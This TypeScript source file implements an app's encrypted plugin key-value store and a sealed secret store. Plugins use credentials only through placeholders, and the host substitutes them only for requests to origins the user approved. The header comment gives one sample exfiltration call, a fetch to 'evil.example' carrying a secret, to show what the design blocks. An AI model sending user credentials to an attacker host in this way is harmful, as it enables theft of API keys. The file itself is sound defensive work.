/**
 * Encrypted plugin storage, and the sealed secret store.
 *
 * ## Why encryption alone is not the answer
 *
 * The threat the user cares about is "a plugin steals my API key and uploads
 * it". Encrypting values at rest does nothing about that: if a plugin can read
 * a value back, it can put that value in a `host.net.fetch` body. Encryption
 * only protects data from things *outside* the app — another origin poking at
 * IndexedDB, a backup, someone with the disk.
 *
 * So secrets here are **sealed**, not merely encrypted:
 *
 *   1. A plugin can never supply or read a secret's plaintext. It calls
 *      `host.secret.request(name, …)`; the *host* draws the prompt, the *user*
 *      types the value, and the plugin gets back `true`/`false`.
 *   2. A plugin uses a secret only by reference, as a `{{secret:name}}`
 *      placeholder inside a `host.net.fetch` header or body. The host
 *      substitutes it at send time.
 *   3. Every secret is bound at creation time to an origin allowlist the user
 *      approved. Substitution into a request aimed anywhere else is refused, so
 *      `fetch('https://evil.example', { headers: { X: '{{secret:key}}' } })`
 *      fails closed.
 *
 * What remains possible, stated plainly: a secret sent to its own approved
 * origin is visible to that server, and a compromised approved server could
 * echo it back. The origin binding bounds the blast radius; it does not remove
 * it. The user sees the exact allowlist when they enter the value.
 *
 * `kv` uses the same envelope encryption but is readable by its owning plugin -
 * it is for preferences, not credentials.
 */
import { del as idbDel, get as idbGet, set as idbSet } from 'idb-keyval'

const KEY_HANDLE = 'omnitool.vault.key.v1'
const KV_PREFIX = 'omnitool.vault.kv.'
const SECRET_PREFIX = 'omnitool.vault.secret.'
const INDEX_KEY = 'omnitool.vault.index.v1'

/* -------------------------------------------------------------------------- */
/* Key management                                                             */
/* -------------------------------------------------------------------------- */

let keyPromise: Promise<CryptoKey> | null = null

/**
 * The vault key is generated once and stored as a **non-extractable**
 * `CryptoKey`. IndexedDB can hold the handle, but neither we nor a plugin nor
 * any script on this origin can read the raw bytes back out - the browser only
 * ever lets us pass the handle to `encrypt`/`decrypt`.
 */
async function vaultKey(): Promise<CryptoKey> {
  keyPromise ??= (async () => {
    const existing = (await idbGet(KEY_HANDLE)) as CryptoKey | undefined
    if (existing) return existing
    const key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt'])
    await idbSet(KEY_HANDLE, key)
    return key
  })()
  return keyPromise
}

interface Envelope {
  /** Initialisation vector; unique per write. */
  iv: Uint8Array
  data: ArrayBuffer
}

async function seal(value: unknown): Promise<Envelope> {
  const iv = crypto.getRandomValues(new Uint8Array(12))
  const plaintext = new TextEncoder().encode(JSON.stringify(value ?? null))
  const data = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, await vaultKey(), plaintext)
  return { iv, data }
}

async function open<T>(envelope: Envelope | undefined): Promise<T | null> {
  if (!envelope) return null
  try {
    const plaintext = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: envelope.iv },
      await vaultKey(),
      envelope.data,
    )
    return JSON.parse(new TextDecoder().decode(plaintext)) as T
  } catch {
    // A failed decrypt means the key was rotated or the record was tampered
    // with. Treat it as absent rather than surfacing a crypto error to a plugin.
    return null
  }
}

/* -------------------------------------------------------------------------- */
/* Key-value store (plugin-readable)                                          */
/* -------------------------------------------------------------------------- */

export async function kvRead(pluginId: string): Promise<Record<string, unknown>> {
  return (await open<Record<string, unknown>>((await idbGet(KV_PREFIX + pluginId)) as Envelope)) ?? {}
}

export async function kvWrite(pluginId: string, store: Record<string, unknown>): Promise<void> {
  await idbSet(KV_PREFIX + pluginId, await seal(store))
}

export async function kvDrop(pluginId: string): Promise<void> {
  await idbDel(KV_PREFIX + pluginId)
}

/* -------------------------------------------------------------------------- */
/* Secret store (write-only from a plugin's point of view)                    */
/* -------------------------------------------------------------------------- */

/** Everything about a secret except its value. Safe to show and to return. */
export interface SecretMeta {
  pluginId: string
  name: string
  /** What the plugin said the credential is for; shown in the prompt. */
  label: string
  /** Origins this secret may be sent to. Exact `https://host[:port]` matches. */
  allowOrigins: string[]
  createdAt: number
  lastUsedAt: number | null
  useCount: number
}

type SecretIndex = Record<string, SecretMeta>

function secretKey(pluginId: string, name: string): string {
  return `${SECRET_PREFIX}${pluginId}/${name}`
}

async function readIndex(): Promise<SecretIndex> {
  return ((await idbGet(INDEX_KEY)) as SecretIndex | undefined) ?? {}
}

async function writeIndex(index: SecretIndex): Promise<void> {
  await idbSet(INDEX_KEY, index)
}

/** Metadata for every stored secret, for the settings panel. */
export async function listSecrets(): Promise<SecretMeta[]> {
  return Object.values(await readIndex()).sort((a, b) => b.createdAt - a.createdAt)
}

export async function listPluginSecrets(pluginId: string): Promise<SecretMeta[]> {
  return (await listSecrets()).filter((meta) => meta.pluginId === pluginId)
}

export async function hasSecret(pluginId: string, name: string): Promise<boolean> {
  return Boolean((await readIndex())[`${pluginId}/${name}`])
}

/**
 * Stores a secret. Only ever called from the host-drawn prompt - there is no
 * path from plugin code to this function that carries a value.
 */
export async function storeSecret(meta: Omit<SecretMeta, 'createdAt' | 'lastUsedAt' | 'useCount'>, value: string): Promise<void> {
  const origins = normaliseOrigins(meta.allowOrigins)
  if (origins.length === 0) throw new Error('凭据必须至少绑定一个目标域名')

  await idbSet(secretKey(meta.pluginId, meta.name), await seal(value))
  const index = await readIndex()
  const existing = index[`${meta.pluginId}/${meta.name}`]
  index[`${meta.pluginId}/${meta.name}`] = {
    ...meta,
    allowOrigins: origins,
    createdAt: existing?.createdAt ?? Date.now(),
    lastUsedAt: existing?.lastUsedAt ?? null,
    useCount: existing?.useCount ?? 0,
  }
  await writeIndex(index)
}

export async function removeSecret(pluginId: string, name: string): Promise<void> {
  await idbDel(secretKey(pluginId, name))
  const index = await readIndex()
  delete index[`${pluginId}/${name}`]
  await writeIndex(index)
}

/** Drops every secret belonging to a plugin, e.g. when it is uninstalled. */
export async function dropPluginSecrets(pluginId: string): Promise<number> {
  const index = await readIndex()
  let removed = 0
  for (const [key, meta] of Object.entries(index)) {
    if (meta.pluginId !== pluginId) continue
    await idbDel(secretKey(pluginId, meta.name))
    delete index[key]
    removed++
  }
  await writeIndex(index)
  return removed
}

function normaliseOrigins(origins: string[]): string[] {
  const out = new Set<string>()
  for (const raw of origins) {
    const text = String(raw).trim()
    if (!text) continue
    try {
      // Accept a bare host or a full URL; store the canonical origin either way.
      const url = new URL(text.includes('://') ? text : `https://${text}`)
      if (url.protocol !== 'https:' && url.protocol !== 'http:') continue
      out.add(url.origin)
    } catch {
      /* unparseable entries are dropped rather than silently widened */
    }
  }
  return [...out]
}

/* -------------------------------------------------------------------------- */
/* Placeholder substitution                                                   */
/* -------------------------------------------------------------------------- */

/** `{{secret:name}}` - the only way a plugin can reference a stored value. */
const PLACEHOLDER = /\{\{\s*secret:([A-Za-z0-9._-]{1,64})\s*\}\}/g

export function referencedSecrets(text: string): string[] {
  const names = new Set<string>()
  for (const match of text.matchAll(PLACEHOLDER)) names.add(match[1])
  return [...names]
}

export interface SubstitutionResult {
  text: string
  used: string[]
}

/**
 * Replaces `{{secret:name}}` references in a request field.
 *
 * Fails closed: an unknown secret, or one not bound to `targetOrigin`, rejects
 * the whole request rather than sending the placeholder through as literal text
 * (which would otherwise leak the *shape* of a plugin's credential use, and more
 * importantly would silently "work" against the wrong host).
 */
export async function substituteSecrets(
  text: string,
  pluginId: string,
  pluginName: string,
  targetOrigin: string,
): Promise<SubstitutionResult> {
  const names = referencedSecrets(text)
  if (names.length === 0) return { text, used: [] }

  const index = await readIndex()
  const values = new Map<string, string>()

  for (const name of names) {
    const meta = index[`${pluginId}/${name}`]
    if (!meta) {
      throw new Error(`插件「${pluginName}」引用了不存在的凭据「${name}」，请先通过 host.secret.request() 录入`)
    }
    if (!meta.allowOrigins.includes(targetOrigin)) {
      throw new Error(
        `已阻止：凭据「${name}」只允许发往 ${meta.allowOrigins.join('、')}，但本次请求的目标是 ${targetOrigin}`,
      )
    }
    const value = await open<string>((await idbGet(secretKey(pluginId, name))) as Envelope)
    if (value === null) throw new Error(`凭据「${name}」已损坏或被清除，请重新录入`)
    values.set(name, value)
  }

  const substituted = text.replace(PLACEHOLDER, (_, name: string) => values.get(name) ?? '')

  // Usage accounting, so the settings panel can show "last used" per credential.
  for (const name of names) {
    const meta = index[`${pluginId}/${name}`]
    meta.lastUsedAt = Date.now()
    meta.useCount += 1
  }
  await writeIndex(index)

  return { text: substituted, used: names }
}
